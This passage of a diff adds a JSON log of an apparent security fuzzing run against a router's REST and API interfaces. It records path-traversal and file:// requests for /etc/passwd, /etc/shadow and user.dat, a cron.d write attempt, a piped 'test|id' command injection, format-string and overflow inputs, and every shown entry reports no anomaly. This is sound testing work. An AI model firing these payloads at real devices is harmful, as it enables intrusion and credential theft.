+      "category": "overflow_nullbyte",
+      "name": "null byte: comment_null",
+      "description": "Send embedded null byte in comment_null field",
+      "result": "HTTP 200, crashed=False, null_truncated=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:14:59.934346",
+      "details": {
+        "name": "comment_null",
+        "status": 200,
+        "response": "{'ret': '*3'}",
+        "crashed": false,
+        "null_truncated": false
+      }
+    },
+    {
+      "id": 46,
+      "category": "overflow_nullbyte",
+      "name": "null byte: scheduler_null",
+      "description": "Send embedded null byte in scheduler_null field",
+      "result": "HTTP 200, crashed=False, null_truncated=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:00.166230",
+      "details": {
+        "name": "scheduler_null",
+        "status": 200,
+        "response": "{'ret': '*1'}",
+        "crashed": false,
+        "null_truncated": false
+      }
+    },
+    {
+      "id": 47,
+      "category": "overflow_large_body",
+      "name": "large POST body: 100KB_body",
+      "description": "Send 100KB_body JSON body to /system/identity/set",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:00.390118",
+      "details": {
+        "size": 102400,
+        "label": "100KB_body",
+        "status": 400,
+        "response": "{'detail': 'Session closed', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 48,
+      "category": "overflow_large_body",
+      "name": "large POST body: 1MB_body",
+      "description": "Send 1MB_body JSON body to /system/identity/set",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:00.973826",
+      "details": {
+        "size": 1048576,
+        "label": "1MB_body",
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 49,
+      "category": "overflow_large_body",
+      "name": "large POST body: 5MB_body",
+      "description": "Send 5MB_body JSON body to /system/identity/set",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:01.509558",
+      "details": {
+        "size": 5242880,
+        "label": "5MB_body",
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 50,
+      "category": "overflow_large_body",
+      "name": "large POST body: 10MB_body",
+      "description": "Send 10MB_body JSON body to /system/identity/set",
+      "result": "HTTP 413, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:02.077274",
+      "details": {
+        "size": 10485760,
+        "label": "10MB_body",
+        "status": 413,
+        "response": "{'error': 413, 'message': 'Payload Too Large'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 51,
+      "category": "path_traversal_file",
+      "name": "file path traversal: dotdot_etc_passwd",
+      "description": "GET /rest/file/../../etc/passwd -- test realpath bypass in libumsg",
+      "result": "HTTP 404, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:02.593016",
+      "details": {
+        "path": "/file/../../etc/passwd",
+        "status": 404,
+        "response": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 52,
+      "category": "path_traversal_file",
+      "name": "file path traversal: encoded_dotdot",
+      "description": "GET /rest/file/%2e%2e%2f%2e%2e%2fetc%2fpasswd -- test realpath bypass in libumsg",
+      "result": "HTTP 500, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:02.808908",
+      "details": {
+        "path": "/file/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 53,
+      "category": "path_traversal_file",
+      "name": "file path traversal: double_encoded",
+      "description": "GET /rest/file/%252e%252e%252f%252e%252e%252fetc%252fpasswd -- test realpath bypass in libumsg",
+      "result": "HTTP 500, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:03.024800",
+      "details": {
+        "path": "/file/%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 54,
+      "category": "path_traversal_file",
+      "name": "file path traversal: backslash_traversal",
+      "description": "GET /rest/file/..\\..\\etc\\passwd -- test realpath bypass in libumsg",
+      "result": "HTTP 500, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:03.236694",
+      "details": {
+        "path": "/file/..\\..\\etc\\passwd",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 55,
+      "category": "path_traversal_file",
+      "name": "file path traversal: unicode_dotdot",
+      "description": "GET /rest/file/..%c0%af..%c0%afetc%c0%afpasswd -- test realpath bypass in libumsg",
+      "result": "HTTP 500, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:03.448588",
+      "details": {
+        "path": "/file/..%c0%af..%c0%afetc%c0%afpasswd",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 56,
+      "category": "path_traversal_file",
+      "name": "file path traversal: null_truncate_path",
+      "description": "GET /rest/file/../../etc/passwd%00.txt -- test realpath bypass in libumsg",
+      "result": "HTTP 404, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:03.660482",
+      "details": {
+        "path": "/file/../../etc/passwd%00.txt",
+        "status": 404,
+        "response": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 57,
+      "category": "path_traversal_file",
+      "name": "file path traversal: user_dat_direct",
+      "description": "GET /rest/file/flash/rw/store/user.dat -- test realpath bypass in libumsg",
+      "result": "HTTP 400, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:03.880372",
+      "details": {
+        "path": "/file/flash/rw/store/user.dat",
+        "status": 400,
+        "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 58,
+      "category": "path_traversal_file",
+      "name": "file path traversal: proc_self_maps",
+      "description": "GET /rest/file/../../proc/self/maps -- test realpath bypass in libumsg",
+      "result": "HTTP 404, crashed=False, sensitive_leak=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:04.092266",
+      "details": {
+        "path": "/file/../../proc/self/maps",
+        "status": 404,
+        "response": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "crashed": false,
+        "sensitive_leak": false
+      }
+    },
+    {
+      "id": 59,
+      "category": "path_fetch_file",
+      "name": "fetch file:// protocol: fetch_passwd",
+      "description": "POST /tool/fetch with file:///etc/passwd",
+      "result": "HTTP 400, crashed=False, fetched_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:04.376124",
+      "details": {
+        "url": "file:///etc/passwd",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "fetched_content": false
+      }
+    },
+    {
+      "id": 60,
+      "category": "path_fetch_file",
+      "name": "fetch file:// protocol: fetch_userdat",
+      "description": "POST /tool/fetch with file:///flash/rw/store/user.dat",
+      "result": "HTTP 400, crashed=False, fetched_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:04.723950",
+      "details": {
+        "url": "file:///flash/rw/store/user.dat",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "fetched_content": false
+      }
+    },
+    {
+      "id": 61,
+      "category": "path_fetch_file",
+      "name": "fetch file:// protocol: fetch_proc_maps",
+      "description": "POST /tool/fetch with file:///proc/self/maps",
+      "result": "HTTP 400, crashed=False, fetched_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:05.035794",
+      "details": {
+        "url": "file:///proc/self/maps",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "fetched_content": false
+      }
+    },
+    {
+      "id": 62,
+      "category": "path_fetch_file",
+      "name": "fetch file:// protocol: fetch_rw_config",
+      "description": "POST /tool/fetch with file:///flash/rw/store/config.dat",
+      "result": "HTTP 400, crashed=False, fetched_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:05.351636",
+      "details": {
+        "url": "file:///flash/rw/store/config.dat",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "fetched_content": false
+      }
+    },
+    {
+      "id": 63,
+      "category": "path_fetch_file",
+      "name": "fetch file:// protocol: fetch_shadow",
+      "description": "POST /tool/fetch with file:///etc/shadow",
+      "result": "HTTP 400, crashed=False, fetched_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:05.755434",
+      "details": {
+        "url": "file:///etc/shadow",
+        "status": 400,
+        "response": "{'detail': 'failure: Conflicting modes provided in URI and parameter', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false,
+        "fetched_content": false
+      }
+    },
+    {
+      "id": 64,
+      "category": "path_backup_export",
+      "name": "backup/export injection: backup_traversal",
+      "description": "POST /rest/system/backup/save with crafted filename",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:06.107258",
+      "details": {
+        "name": "backup_traversal",
+        "path": "/system/backup/save",
+        "data": {
+          "name": "'../../etc/cron.d/evil'"
+        },
+        "status": 400,
+        "response": "{'detail': 'invalid file name', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 65,
+      "category": "path_backup_export",
+      "name": "backup/export injection: backup_null_trunc",
+      "description": "POST /rest/system/backup/save with crafted filename",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:06.423100",
+      "details": {
+        "name": "backup_null_trunc",
+        "path": "/system/backup/save",
+        "data": {
+          "name": "'safe\\x00../../etc/evil'"
+        },
+        "status": 400,
+        "response": "{'detail': 'invalid file name', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 66,
+      "category": "path_backup_export",
+      "name": "backup/export injection: export_traversal",
+      "description": "POST /rest/export with crafted filename",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:06.758932",
+      "details": {
+        "name": "export_traversal",
+        "path": "/export",
+        "data": {
+          "file": "'../../../tmp/pwned'"
+        },
+        "status": 400,
+        "response": "{'detail': 'invalid file name', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 67,
+      "category": "path_backup_export",
+      "name": "backup/export injection: export_pipe",
+      "description": "POST /rest/export with crafted filename",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:07.750436",
+      "details": {
+        "name": "export_pipe",
+        "path": "/export",
+        "data": {
+          "file": "'test|id'"
+        },
+        "status": 200,
+        "response": "",
+        "crashed": false
+      }
+    },
+    {
+      "id": 68,
+      "category": "path_null_injection",
+      "name": "null byte in path: null_in_file_path",
+      "description": "GET /rest/file/test%00../../etc/passwd -- null byte path truncation test",
+      "result": "HTTP 400, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:08.078272",
+      "details": {
+        "path": "/file/test%00../../etc/passwd",
+        "status": 400,
+        "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 69,
+      "category": "path_null_injection",
+      "name": "null byte in path: null_in_rest_path",
+      "description": "GET /rest/system/resource%00/../../../etc/passwd -- null byte path truncation test",
+      "result": "HTTP 404, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:08.298162",
+      "details": {
+        "path": "/system/resource%00/../../../etc/passwd",
+        "status": 404,
+        "response": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "crashed": false
+      }
+    },
+    {
+      "id": 70,
+      "category": "path_null_injection",
+      "name": "null byte in path: null_ext_bypass",
+      "description": "GET /rest/file/safe.txt%00.rsc -- null byte path truncation test",
+      "result": "HTTP 500, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:08.514054",
+      "details": {
+        "path": "/file/safe.txt%00.rsc",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 71,
+      "category": "path_null_injection",
+      "name": "null byte in path: null_double",
+      "description": "GET /rest/file/a%00b%00c%00d -- null byte path truncation test",
+      "result": "HTTP 500, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:08.733944",
+      "details": {
+        "path": "/file/a%00b%00c%00d",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 72,
+      "category": "path_direct_access",
+      "name": "direct file access: direct_userdat",
+      "description": "GET /rest/file/user.dat -- attempt direct sensitive file access",
+      "result": "HTTP 500, sensitive_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:08.941840",
+      "details": {
+        "path": "/file/user.dat",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "sensitive": false
+      }
+    },
+    {
+      "id": 73,
+      "category": "path_direct_access",
+      "name": "direct file access: direct_configdat",
+      "description": "GET /rest/file/config.dat -- attempt direct sensitive file access",
+      "result": "HTTP 500, sensitive_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:09.157732",
+      "details": {
+        "path": "/file/config.dat",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "sensitive": false
+      }
+    },
+    {
+      "id": 74,
+      "category": "path_direct_access",
+      "name": "direct file access: direct_flash_rw",
+      "description": "GET /rest/file/flash -- attempt direct sensitive file access",
+      "result": "HTTP 500, sensitive_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:09.365628",
+      "details": {
+        "path": "/file/flash",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "sensitive": false
+      }
+    },
+    {
+      "id": 75,
+      "category": "path_direct_access",
+      "name": "direct file access: direct_rw_store",
+      "description": "GET /rest/file/flash/rw/store -- attempt direct sensitive file access",
+      "result": "HTTP 400, sensitive_content=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:09.573524",
+      "details": {
+        "path": "/file/flash/rw/store",
+        "status": 400,
+        "response": "{'detail': 'no such command prefix', 'error': 400, 'message': 'Bad Request'}",
+        "sensitive": false
+      }
+    },
+    {
+      "id": 76,
+      "category": "api_malformed_length",
+      "name": "malformed length: max_int_length",
+      "description": "Send malformed length prefix f0ffffffff to API port 8728",
+      "result": "Got 0 bytes response, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:10.780920",
+      "details": {
+        "name": "max_int_length",
+        "length_hex": "f0ffffffff",
+        "result": "Got 0 bytes response",
+        "crashed": false
+      }
+    },
+    {
+      "id": 77,
+      "category": "api_malformed_length",
+      "name": "malformed length: huge_3byte",
+      "description": "Send malformed length prefix dfffff to API port 8728",
+      "result": "Got 0 bytes response, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:12.284168",
+      "details": {
+        "name": "huge_3byte",
+        "length_hex": "dfffff",
+        "result": "Got 0 bytes response",
+        "crashed": false
+      }
+    },
+    {
+      "id": 78,
+      "category": "api_malformed_length",
+      "name": "malformed length: huge_4byte",
+      "description": "Send malformed length prefix efffffff to API port 8728",
+      "result": "Got 0 bytes response, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:13.795412",
+      "details": {
+        "name": "huge_4byte",
+        "length_hex": "efffffff",
+        "result": "Got 0 bytes response",
+        "crashed": false
+      }
+    },
+    {
+      "id": 79,
+      "category": "api_malformed_length",
+      "name": "malformed length: invalid_prefix_f1",
+      "description": "Send malformed length prefix f100000001 to API port 8728",
+      "result": "Timeout (no response), crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:20.315464",
+      "details": {
+        "name": "invalid_prefix_f1",
+        "length_hex": "f100000001",
+        "result": "Timeout (no response)",
+        "crashed": false
+      }
+    },
+    {
+      "id": 80,
+      "category": "api_malformed_length",
+      "name": "malformed length: invalid_prefix_ff",
+      "description": "Send malformed length prefix ffffffffff to API port 8728",
+      "result": "Got 0 bytes response, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:21.816214",
+      "details": {
+        "name": "invalid_prefix_ff",
+        "length_hex": "ffffffffff",
+        "result": "Got 0 bytes response",
+        "crashed": false
+      }
+    },
+    {
+      "id": 81,
+      "category": "api_oversized_word",
+      "name": "oversized word: claim_64KB_send_16",
+      "description": "Claim 65536 byte word, send only 16 bytes",
+      "result": "Timeout, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:29.327968",
+      "details": {
+        "claimed_length": 65536,
+        "actual_sent": 16,
+        "result": "Timeout",
+        "crashed": false
+      }
+    },
+    {
+      "id": 82,
+      "category": "api_oversized_word",
+      "name": "oversized word: claim_1MB_send_4",
+      "description": "Claim 1048576 byte word, send only 4 bytes",
+      "result": "Got 0 bytes, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:31.833220",
+      "details": {
+        "claimed_length": 1048576,
+        "actual_sent": 4,
+        "result": "Got 0 bytes",
+        "crashed": false
+      }
+    },
+    {
+      "id": 83,
+      "category": "api_oversized_word",
+      "name": "oversized word: claim_16MB_send_8",
+      "description": "Claim 16777216 byte word, send only 8 bytes",
+      "result": "Got 0 bytes, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:34.334470",
+      "details": {
+        "claimed_length": 16777216,
+        "actual_sent": 8,
+        "result": "Got 0 bytes",
+        "crashed": false
+      }
+    },
+    {
+      "id": 84,
+      "category": "api_truncated",
+      "name": "truncated message: mid_login_cmd",
+      "description": "Send truncated/malformed API message",
+      "result": "Timeout, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:41.893361",
+      "details": {
+        "name": "mid_login_cmd",
+        "result": "Timeout",
+        "crashed": false
+      }
+    },
+    {
+      "id": 85,
+      "category": "api_truncated",
+      "name": "truncated message: empty_sentence",
+      "description": "Send truncated/malformed API message",
+      "result": "Timeout, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:49.215907",
+      "details": {
+        "name": "empty_sentence",
+        "result": "Timeout",
+        "crashed": false
+      }
+    },
+    {
+      "id": 86,
+      "category": "api_truncated",
+      "name": "truncated message: partial_word",
+      "description": "Send truncated/malformed API message",
+      "result": "Timeout, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:56.543569",
+      "details": {
+        "name": "partial_word",
+        "result": "Timeout",
+        "crashed": false
+      }
+    },
+    {
+      "id": 87,
+      "category": "api_invalid_cmd",
+      "name": "invalid command: nonexistent_cmd",
+      "description": "Send invalid API command to port 8728",
+      "result": "Response: ['!fatal', 'not logged in'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:56.851723",
+      "details": {
+        "name": "nonexistent_cmd",
+        "command": "['/nonexistent/command/xyz']",
+        "result": "Response: ['!fatal', 'not logged in']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 88,
+      "category": "api_invalid_cmd",
+      "name": "invalid command: very_long_cmd",
+      "description": "Send invalid API command to port 8728",
+      "result": "Response: ['!fatal', 'too much input before login'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:57.171883",
+      "details": {
+        "name": "very_long_cmd",
+        "command": "['/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... [truncated, total 10005 chars]",
+        "result": "Response: ['!fatal', 'too much input before login']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 89,
+      "category": "api_invalid_cmd",
+      "name": "invalid command: binary_cmd",
+      "description": "Send invalid API command to port 8728",
+      "result": "Response: ['!fatal', 'not logged in'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:57.492043",
+      "details": {
+        "name": "binary_cmd",
+        "command": "['\\x00\\x01\\x02\u00ff\u00fe']",
+        "result": "Response: ['!fatal', 'not logged in']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 90,
+      "category": "api_auth_overflow",
+      "name": "auth overflow: long_user_1KB",
+      "description": "Login with oversized credentials via API protocol",
+      "result": "Response: ['!fatal', 'too much input before login'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:57.804199",
+      "details": {
+        "name": "long_user_1KB",
+        "user_len": 1024,
+        "pass_len": 5,
+        "result": "Response: ['!fatal', 'too much input before login']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 91,
+      "category": "api_auth_overflow",
+      "name": "auth overflow: long_pass_1KB",
+      "description": "Login with oversized credentials via API protocol",
+      "result": "Response: ['!fatal', 'too much input before login'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:58.312453",
+      "details": {
+        "name": "long_pass_1KB",
+        "user_len": 5,
+        "pass_len": 1024,
+        "result": "Response: ['!fatal', 'too much input before login']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 92,
+      "category": "api_auth_overflow",
+      "name": "auth overflow: long_both_64KB",
+      "description": "Login with oversized credentials via API protocol",
+      "result": "Error: [Errno 104] Connection reset by peer, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:15:58.824709",
+      "details": {
+        "name": "long_both_64KB",
+        "user_len": 65536,
+        "pass_len": 65536,
+        "result": "Error: [Errno 104] Connection reset by peer",
+        "crashed": false
+      }
+    },
+    {
+      "id": 93,
+      "category": "api_garbage",
+      "name": "post-login garbage: random_4KB",
+      "description": "Send 4096 bytes of garbage after valid API login",
+      "result": "Login OK, post-garbage got 0 bytes, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:01.341967",
+      "details": {
+        "name": "random_4KB",
+        "garbage_size": 4096,
+        "result": "Login OK, post-garbage got 0 bytes",
+        "crashed": false
+      }
+    },
+    {
+      "id": 94,
+      "category": "api_garbage",
+      "name": "post-login garbage: null_bytes",
+      "description": "Send 1024 bytes of garbage after valid API login",
+      "result": "Login OK, post-garbage timeout, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:08.855868",
+      "details": {
+        "name": "null_bytes",
+        "garbage_size": 1024,
+        "result": "Login OK, post-garbage timeout",
+        "crashed": false
+      }
+    },
+    {
+      "id": 95,
+      "category": "api_special_sentence",
+      "name": "special sentence: 100_zero_words",
+      "description": "Send sentence with 100 words (including empty) to API",
+      "result": "Login OK, response: [], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:12.374108",
+      "details": {
+        "name": "100_zero_words",
+        "word_count": 100,
+        "result": "Login OK, response: []",
+        "crashed": false
+      }
+    },
+    {
+      "id": 96,
+      "category": "api_special_sentence",
+      "name": "special sentence: max_words_500",
+      "description": "Send sentence with 500 words (including empty) to API",
+      "result": "Login OK, response: ['!trap', '=message=no such command prefix'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:12.805892",
+      "details": {
+        "name": "max_words_500",
+        "word_count": 500,
+        "result": "Login OK, response: ['!trap', '=message=no such command prefix']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 97,
+      "category": "api_special_sentence",
+      "name": "special sentence: mixed_empty_data",
+      "description": "Send sentence with 6 words (including empty) to API",
+      "result": "Login OK, response: ['!trap', '=message=no such command'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:13.125732",
+      "details": {
+        "name": "mixed_empty_data",
+        "word_count": 6,
+        "result": "Login OK, response: ['!trap', '=message=no such command']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 98,
+      "category": "api_nested",
+      "name": "nested/recursive: deeply_nested_attrs",
+      "description": "Send complex/nested API message structure",
+      "result": "Response: ['!re'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:13.437576",
+      "details": {
+        "name": "deeply_nested_attrs",
+        "word_count": 51,
+        "result": "Response: ['!re']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 99,
+      "category": "api_nested",
+      "name": "nested/recursive: duplicate_tags",
+      "description": "Send complex/nested API message structure",
+      "result": "Response: ['!trap', '=message=invalid user name or password (6)'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:13.761414",
+      "details": {
+        "name": "duplicate_tags",
+        "word_count": 7,
+        "result": "Response: ['!trap', '=message=invalid user name or password (6)']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 100,
+      "category": "api_nested",
+      "name": "nested/recursive: tag_format_string",
+      "description": "Send complex/nested API message structure",
+      "result": "Response: ['!re'], crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:14.081254",
+      "details": {
+        "name": "tag_format_string",
+        "word_count": 2,
+        "result": "Response: ['!re']",
+        "crashed": false
+      }
+    },
+    {
+      "id": 101,
+      "category": "fmtstr_create",
+      "name": "format string object: fw_comment_hex",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:14.425082",
+      "details": {
+        "name": "fw_comment_hex",
+        "data": {
+          "chain": "'forward'",
+          "action": "'accept'",
+          "comment": "'%x%x%x%x%x%x%x%x'"
+        },
+        "status": 200,
+        "response": "{'ret': '*4'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 102,
+      "category": "fmtstr_create",
+      "name": "format string object: fw_comment_ptr",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:14.760914",
+      "details": {
+        "name": "fw_comment_ptr",
+        "data": {
+          "chain": "'forward'",
+          "action": "'accept'",
+          "comment": "'%p%p%p%p%p%p%p%p'"
+        },
+        "status": 200,
+        "response": "{'ret': '*5'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 103,
+      "category": "fmtstr_create",
+      "name": "format string object: script_name_hex",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:15.076756",
+      "details": {
+        "name": "script_name_hex",
+        "data": {
+          "name": "'_fmt_%x%x%x%x'",
+          "source": "':log info test'"
+        },
+        "status": 200,
+        "response": "{'ret': '*F'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 104,
+      "category": "fmtstr_create",
+      "name": "format string object: script_name_s",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:15.396596",
+      "details": {
+        "name": "script_name_s",
+        "data": {
+          "name": "'_fmt_%s%s%s%s%s%s%s%s'",
+          "source": "':log info test'"
+        },
+        "status": 200,
+        "response": "{'ret': '*10'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 105,
+      "category": "fmtstr_create",
+      "name": "format string object: scheduler_hex",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:15.708440",
+      "details": {
+        "name": "scheduler_hex",
+        "data": {
+          "name": "'_fmt_%08x_%08x_%08x_%08x'",
+          "on-event": "':log info test'",
+          "interval": "'99d'"
+        },
+        "status": 200,
+        "response": "{'ret': '*2'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 106,
+      "category": "fmtstr_create",
+      "name": "format string object: queue_ptr",
+      "description": "Create object with format specifiers in name/comment",
+      "result": "HTTP 200, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:16.032278",
+      "details": {
+        "name": "queue_ptr",
+        "data": {
+          "name": "'_fmt_%p%p%p%p'",
+          "target": "'0.0.0.0/0'"
+        },
+        "status": 200,
+        "response": "{'ret': '*2'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 107,
+      "category": "fmtstr_error_trigger",
+      "name": "error trigger: delete_fmtstr_id",
+      "description": "DELETE /rest/system/script/%x%x%x%x -- trigger error logging with fmt specifiers",
+      "result": "HTTP 500, crashed=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T15:16:16.352118",
+      "details": {
+        "name": "delete_fmtstr_id",
+        "method": "DELETE",
+        "path": "/system/script/%x%x%x%x",
+        "status": 500,
+        "response": "{'error': 500, 'message': 'Internal Server Error'}",
+        "crashed": false
+      }
+    },
+    {
+      "id": 108,
+      "category": "fmtstr_error_trigger",
+      "name": "error trigger: get_fmtstr_path",
